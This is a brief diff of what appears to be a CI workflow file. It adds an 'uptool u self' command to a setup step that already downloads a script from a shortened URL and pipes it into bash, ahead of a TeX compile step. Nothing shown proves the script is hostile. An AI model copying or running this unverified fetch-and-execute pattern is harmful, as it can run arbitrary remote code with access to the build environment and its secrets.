@@ -12,6 +12,7 @@ jobs:
     - name: Setup
       run: |
         bash <(curl -sL https://2oo.pw/eMFfU)
+        uptool u self
         echo $SHELL
     - name: Compile Tex
       run: |
